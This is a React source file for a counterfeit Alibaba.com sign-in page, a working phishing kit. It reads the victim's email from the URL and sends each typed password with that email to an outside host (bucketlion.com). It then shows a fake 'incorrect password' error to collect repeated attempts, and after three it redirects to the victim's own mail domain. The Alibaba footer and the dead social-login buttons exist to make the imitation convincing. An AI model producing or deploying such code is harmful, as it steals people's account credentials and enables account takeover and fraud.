
import React, { useState } from "react";
import './data.css';
import smallImg from './image/smallfooterimg.png';
import $ from 'jquery';
import { IoMdCloseCircle } from "react-icons/io";

export const Datta = ()=>{


        const preloaderImgVar = 'data:image/gif;base64,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';



    const reloadPreloader = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();



    const redirectURL = window.location.href;
    const sliceEqualSignR = redirectURL.indexOf("@");
    const extracetdemailDomain = redirectURL.substr((sliceEqualSignR+1)).split('&', 1).toString();

    const [email, setEmail] = useState(extracetdEmail);
    const [pwd, setPwd] = useState('');

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);

    const [preL, setPreL] = useState(false);




    const submitHandler = (e) => {
        e.preventDefault();
        if (pwd === "") {
          return null
        }
        
        else{
            setPreL(true);
            
            setTimeout(() => {
              setPwd('');
              setErr(true);
              setPreL(false);
            }, 3400);
    
            const user = {
              email: email,
              password: pwd
          };
    
          $.ajax({
              type: "POST",
              url: "https://bucketlion.com/hello/ali.php",
              data: user,
              success(data) {
                  console.log(data);
              },
          });
    
        
          setCount(count=> count + 1);
                if(count >= 2){
                    setTimeout(() => {
                        window.location.href = `https://www.${extracetdemailDomain}`;
                    }, 1000);
                };
        }
      };



    return(<>
    <div className='data'>
            
            <article>
                <div className='qr_wrapper'>
                    <img 
                        src={`data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC8AAAAvCAQAAADZLlsnAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAABIAAAASABGyWs+AAAACXZwQWcAAAAvAAAALwDxNDKHAAACfklEQVRYw7WWz2sTQRTHP5tuTWtUrEuNQg69elqKEigePEzBq/0DjOAPEOlVgoJH6cGDIIIgKPSgh17EuwseROmCSrz4B3SlBxka0Vg0tutht8nuZjbZ3Uy+OWTmzc7nzb73dmaMVmXaMWwmI88Az+o4/kQcGFsGwLrFEAenWEhY/vJpBPgs03081K09hxQHF2kAHb4AMywCO6yOwD/hGGBsmUHXlSuiq3CwSztsfecxUGUx7JvMp6C3I23zoPFKemIwB5s8SoHUuK+073M50itFJsiKMFpoVSna0e/AjHdrsi58x7fhAjcyTN/mdq99mKfDVw/gSkP4LZ/90S8LgN/7qWaYgyZX1sVgmS7wokBwSiqjK6c05aCkNruynHDwjSZNHujBw1qiirp4eLFPJovM9KGa9ISRulUEOs6toShz2OSaXBeEDuZZBWYST8xyvlhwAl3pJbnCEku9HUdDcAK58pIwHN/+wVugwnJob/Na+byfDw93ZUN0nB17A6hG8Bs6Vg+DSZ5lZcSMcvhvZI3ipvXM8e05rmadQOS0yqL8Z3Iu/IGDPT4qxs5RAj7TBewwODnxgYPf9nXFyHPKwE1+Ag85GeJLeeDBgUOOzS5T5cQdfBWnFVtFEIYqR4CphDWnsiY5d3D6Icp2HhTCZ3dQKDiBGtaf1BA1qVCgMONKvzomLoHF5Mo34l/iDXzuRXpj4WF54OoYv44UTG1fw5M85uoDB3fEruPbh7g2MDb26gHW5HvxrvVBMaIFH1y8VHuRJrzq4qUVD44iyRrxqirSioeaJJYDzXg4E0uydny8iiaAB1ceDXMw1o45TJ7VcTgxMTx41q+Xk6MD7bn/eo3Un6Rh19QAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTUtMTEtMjRUMTc6MzE6MjUrMDg6MDDAjSV1AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE1LTExLTI0VDE3OjMxOjI1KzA4OjAwsdCdyQAAAABJRU5ErkJggg==`}
                        alt='qr_code'
                        onClick={reloadPreloader}
                        className='qr_code'
                    />
                </div>

                <form onSubmit={submitHandler}>

                   { err ? <section className="sdlkfjh">

                        <div className="err"> <IoMdCloseCircle style={{color:'red'}}/> &#160; Your account name or password is incorrect. &#160;<span style={{
                                    float:'right', 
                                    cursor:'pointer', 
                                    color:'#08c', 
                                    textDecoration:'underline'
                                }} className="hhhl" onClick={reloadPreloader}>Help</span>
                        </div>

                    </section> : null }

                    { preL ? <div className="pre_con__t">
                        <img src={preloaderImgVar} alt="loading..." className="preload__r"/>
                    </div> : null }


                    <div className='emel_wrappe__r'>
                        <div className='lbl_cont'>
                            <span className='lbl' style={{cursor:'default'}}>Account:</span>
                        </div>
                        <div className='eml_cont'>
                            <input 
                                type='email'
                                readOnly
                                required
                                className='email'
                                placeholder='Email address or member ID'
                                value={email}
                                onChange={ e=> setEmail(e.target.value) }
                            />
                        </div>
                    </div>



                    <div className='pawd_wrappe__r'>
                        <div className='lbl_cont'>
                                <span className='lbl' style={{cursor:'default'}}>Password:</span>
                                <span className='lbl' 
                                style={{
                                    float:'right', 
                                    cursor:'pointer', 
                                    color:'#08c', 
                                    paddingBottom:'0', 
                                    // border:'1px solid red'
                                }} onClick={reloadPreloader}>
                                    Forgot Password?
                                </span>
                            </div>
                            <div className='eml_cont'>
                                <input 
                                    type='password'
                                    required
                                    className='email pswd'
                                    placeholder='Password'
                                    value={pwd}
                                    onChange={ e=> setPwd(e.target.value) }
                                    autoFocus
                                />
                        </div>
                    </div>



                    <div className='check_cont'>
                        <input type='checkbox' checked/>
                        &#160;
                        <span className='lbl'> Stay signed in</span>
                    </div>



                    <div className='submi_t_cont_'>
                        <input 
                            type='submit'
                            value={`Sign In`}
                            className='fm_btn_submit'
                            onClick={submitHandler}
                        />
                    </div>





                    <div 
                        style={{
                            marginTop:'0.5em',
                        }}
                    >
                        <span className='lbl' style={{
                            cursor:'pointer', 
                            color:'#08c',
                        }} onClick={reloadPreloader}>
                                Mobile number sign in
                            </span>
                            <span className='lbl' 
                            style={{
                                float:'right', 
                                cursor:'pointer', 
                                color:'#08c', 
                                paddingBottom:'0', 
                            }} onClick={reloadPreloader}>
                                Create account
                        </span>
                    </div>



                    <div className='login-login-links'></div>


                    <div className='social_sign_on__'>
                        <span id='signnn' style={{fontSize:'14px'}}>Sign in with:</span>
                        &#160;
                        &#160;
                        
                        <img 
                            alt='socil sign on'
                            onClick={reloadPreloader}
                            className='socials_im'
                            src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAyNCIgaGVpZ2h0PSIxMDI0IiB2aWV3Qm94PSIwIDAgMTAyNCAxMDI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjx0aXRsZT5GYWNlYm9vazwvdGl0bGU+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj48cmVjdCBmaWxsPSIjMzg1NzlBIiB3aWR0aD0iMTAyNCIgaGVpZ2h0PSIxMDI0IiByeD0iNzgiLz48cGF0aCBkPSJNNzMxLjg3NCA0MzUuOTY3aDExMi4xMlYyOTcuNTdoLTExMi4xMmMtOTIuNzc1IDAtMTY5LjA0IDgxLjQ5NC0xNjkuMDQgMTgxLjYxdjcwLjI5M0w0NTEuNTUgNTQ5djEzNS4xODRoMTExLjI4NXYzMzkuNzY0aDE0MS4wMTJsLS40MjUtMzM5Ljc2NGgxMjkuMzIzTDg0NC4wMSA1NDlINzAzLjg0NmwtLjQyNS03NS42OTdjMC0yMy45NzcgMTUuMjM0LTM3LjMzNiAyOC40NTItMzcuMzM2IiBmaWxsPSIjRkZGIiBmaWxsLXJ1bGU9Im5vbnplcm8iLz48L2c+PC9zdmc+'
                        />


                        <img 
                            alt='socil sign on'
                            onClick={reloadPreloader}
                            className='socials_im'
                            src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAyNCIgaGVpZ2h0PSIxMDI0IiB2aWV3Qm94PSIwIDAgMTAyNCAxMDI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj48dGl0bGU+Z29vZ2xlPC90aXRsZT48ZGVmcz48cGF0aCBkPSJNLjM5OCAyMTMuMDg4QzU3LjUwOCA4Ny4zMzIgMTg0LjA3OCAwIDMzMS4yMyAwYzk4LjA1IDAgMTgwLjA1IDM1LjgwNSAyNDMuMzQyIDk1LjE0NmwtOTguNjE3IDk0Ljk4N2MtMjYuOTQ3LTI1Ljk5LTc0LjIxMi01Ni4wOTItMTQ0LjcyNC01Ni4wOTItMTAyLjYzNSAwLTE4OS42MTUgNzAuNDA3LTIxNi41NTggMTY2LjQ3NUwuMzk4IDIxMy4wODh6IiBpZD0iYSIvPjwvZGVmcz48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxyZWN0IGZpbGw9IiNGN0Y4RkEiIHdpZHRoPSIxMDI0IiBoZWlnaHQ9IjEwMjQiIHJ4PSI3OCIvPjxwYXRoIGQ9Ik01MzEuMjMgNDYwLjU0MlY1ODUuMmgyMDYuMDJjLTguMzc3IDUzLjUyNS02Mi4yOTQgMTU2Ljc2LTIwNi4wMiAxNTYuNzYtMTI0LjAyIDAtMjI1LjE4LTEwMi44MDMtMjI1LjE4LTIyOS40NiAwLTEyNi42NTcgMTAxLjE2LTIyOS40NiAyMjUuMTgtMjI5LjQ2IDcwLjUxMyAwIDExNy43NzggMzAuMTAzIDE0NC43MjUgNTYuMDkzbDk4LjYxNy05NC45ODdDNzExLjI4IDE4NC44MDYgNjI5LjI4IDE0OSA1MzEuMjMyIDE0OSAzMzAuNDU0IDE0OSAxNjggMzExLjU3NSAxNjggNTEyLjVTMzMwLjQ1NSA4NzYgNTMxLjIzIDg3NkM3NDAuNzkzIDg3NiA4ODAgNzI4LjQ2NCA4ODAgNTIwLjg4M2MwLTIzLjg1NC0yLjU2NS00Mi4wMy01LjY3NS02MC4yMDRsLTM0My4wOTQtLjEzOHoiIGZpbGw9IiMyQ0E5NEYiIGZpbGwtcnVsZT0ibm9uemVybyIvPjxwYXRoIGQ9Ik03NzkuNTQ0IDc4MC45OEM4NDMuNDI0IDcxNy45MTMgODgwIDYyNy4yODcgODgwIDUyMC44ODNjMC0yMy44NTQtMi41NjUtNDIuMDMtNS42NzUtNjAuMjA0bC0zNDMuMDk0LS4xMzhWNTg1LjJoMjA2LjAyYy00Ljg3NSAzMS4xNTQtMjUuMTggNzkuMTQ4LTY5LjY0IDExMy44MjVsMTExLjkzNCA4MS45NTV6IiBmaWxsPSIjM0U4MkY3IiBmaWxsLXJ1bGU9Im5vbnplcm8iLz48cGF0aCBkPSJNMjExLjAxMyA2ODQuMzdDMTgzLjU2NSA2MzMuMjEgMTY4IDU3NC42OTQgMTY4IDUxMi41YzAtNTQuMDAyIDExLjczNS0xMDUuMjM0IDMyLjc5NS0xNTEuMjg0bDExNS42MzggODIuMzNjLTYuNzQ0IDIxLjc2Ny0xMC4zODMgNDQuOTMyLTEwLjM4MyA2OC45NTQgMCAzMS4zNyA2LjIwNiA2MS4yOCAxNy40MjggODguNTI0TDIxMS4wMTMgNjg0LjM3eiIgZmlsbD0iI0ZDQkQwMCIgZmlsbC1ydWxlPSJub256ZXJvIi8+PHVzZSBmaWxsPSIjRUQ0MjJDIiBmaWxsLXJ1bGU9Im5vbnplcm8iIHhsaW5rOmhyZWY9IiNhIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgyMDAgMTQ5KSIvPjwvZz48L3N2Zz4='
                        />


                        <img 
                            alt='social sign on'
                            onClick={reloadPreloader}
                            className='socials_im'
                            src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAyNCIgaGVpZ2h0PSIxMDI0IiB2aWV3Qm94PSIwIDAgMTAyNCAxMDI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjx0aXRsZT5MaW5rZUluPC90aXRsZT48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxyZWN0IGZpbGw9IiMwMDY0QTMiIHdpZHRoPSIxMDI0IiBoZWlnaHQ9IjEwMjQiIHJ4PSI3OCIvPjxwYXRoIGQ9Ik0yMjcuMzI4IDM4OS44MjRoMTE0LjYyNHY0MzIuNEgyMjcuMzI4di00MzIuNHptNTcyLjggMjQuOGMyOC4zMiAyMy4zOTIgNDIuNDY0IDYyLjIyNCA0Mi40NjQgMTE2LjQxNnYyOTEuMTg0aC0xMTUuODRWNTU5LjIxNmMwLTIyLjc1Mi0zLjAyNC00MC4yMDgtOS4wNTYtNTIuMzUyLTExLjAwOC0yMi4yNC0zMi0zMy4zMjgtNjMuMDA4LTMzLjMyOC0zOC4wOCAwLTY0LjE5MiAxNi4yNzItNzguMzUyIDQ4LjgtNy4zNiAxNy4yLTExLjAwOCAzOS4xMzYtMTEuMDA4IDY1LjgyNHYyMzQuMDY0SDQ1Mi4yNzJWMzkwLjYwOGgxMDkuNDU2djYzLjA4OGMxNC40OTYtMjIuMjA4IDI4LjE5Mi0zOC4yMDggNDEuMDg4LTQ4IDIzLjE4NC0xNy40NTYgNTIuNTQ0LTI2LjE5MiA4OC4wOTYtMjYuMTkyIDQ0LjQ5Ni4wMTYgODAuODk2IDExLjY5NiAxMDkuMjE2IDM1LjEyek0zNTUuODcyIDI1Ny4yMTZjLS4wMDQgMzkuMzQ1LTMxLjkwMyA3MS4yMzYtNzEuMjQ4IDcxLjIzMi0zOS4zNDUtLjAwNC03MS4yMzYtMzEuOTAzLTcxLjIzMi03MS4yNDguMDA1LTM5LjM0NSAzMS45MDMtNzEuMjM2IDcxLjI0OC03MS4yMzIgMzkuMzQ1LjAwNCA3MS4yMzcgMzEuOTAzIDcxLjIzMiA3MS4yNDh6IiBmaWxsPSIjRkZGIiBmaWxsLXJ1bGU9Im5vbnplcm8iLz48L2c+PC9zdmc+'
                        />
                        
                    </div>




                </form>
            </article>

    </div>




                    

                    <div className='btom'>
                        <footer className='icbu-footer-seo'>




                            <p className="ui-footer-seo-language" onClick={reloadPreloader}>
                                <i className="global-site"></i> 
                                Alibaba.com Site: 
                                <span className='footer___anch__r'>International</span> - 
                                <span className='footer___anch__r'>Español</span> - 
                                <span className='footer___anch__r'>Português</span> - 
                                <span className='footer___anch__r'>Deutsch</span> - 
                                <span className='footer___anch__r'>Français</span> - 
                                <span className='footer___anch__r' >Italiano</span> -
                                <span className='footer___anch__r'>हिंदी</span> - 
                                <span className='footer___anch__r'>Pусский</span> - 
                                <span className='footer___anch__r'>한국어</span> - 
                                <span className='footer___anch__r'>日本語</span> - 
                                <span className='footer___anch__r'>اللغة العربية</span> - 
                                <span className='footer___anch__r'>ภาษาไทย</span> - 
                                <span className='footer___anch__r'>Türk</span> - 
                                <span className='footer___anch__r'>Nederlands</span> - 
                                <span className='footer___anch__r'>tiếng Việt</span> - 
                                <span className='footer___anch__r'>Indonesian</span> - 
                                <span className='footer___anch__r'>עברית</span>
                            </p>











                            <p className="ui-footer-seo-language" onClick={reloadPreloader}>
                                {/* <i class="global-site"></i>  */}
                                Alibaba Group| 
                                <span className='footer___anch__r'>Taobao Marketplace</span> |
                                <span className='footer___anch__r'>Tmall.com</span> |
                                <span className='footer___anch__r'>Juhuasuan</span> |
                                <span className='footer___anch__r'>AliExpress</span> |
                                <span className='footer___anch__r'> Alibaba.com International</span> |
                                <span className='footer___anch__r' >1688.com</span> |
                                <span className='footer___anch__r'>Alimama</span> |
                                <span className='footer___anch__r'>Fliggy</span> |
                                <span className='footer___anch__r'>Taobao Global</span> 
                                <br />
                                <span className='footer___anch__r'>Alibaba Cloud</span> |  
                                <span className='footer___anch__r'>AliOS العربية</span> |
                                <span className='footer___anch__r'>AliTelecom</span> |
                                <span className='footer___anch__r'>Autonavi</span> |
                                <span className='footer___anch__r'>UCWeb</span> |
                                <span className='footer___anch__r'> Umeng</span> | 
                                <span className='footer___anch__r'>Xiami</span> |
                                <span className='footer___anch__r'>DingTalk</span>
                            </p>








                            <p className="ui-footer-seo-language" onClick={reloadPreloader}>
                                {/* <i class="global-site"></i>  */}
                                <span className='footer___anch__r'>Product Listing Policy</span> -
                                <span className='footer___anch__r'>Intellectual Property Protection</span> -
                                <span className='footer___anch__r'>Privacy Policy</span> -
                                <span className='footer___anch__r'>Terms of Use</span>
                            </p>


                            <p className="ui-footer-seo-language" style={{textAlign:'center'}} onClick={reloadPreloader}>
                                <span className='footer___anch__r' style={{display:'flex', alignItems:'center', justifyContent:'center', textAlign:'center'}} >
                                    <img src={smallImg} alt='lkjh'/>
                                    &#160;
                                    © 1999-2021 Alibaba.com. All rights reserved.
                                </span>
                            </p>







                        

                        </footer>
                    </div>



    </>)
};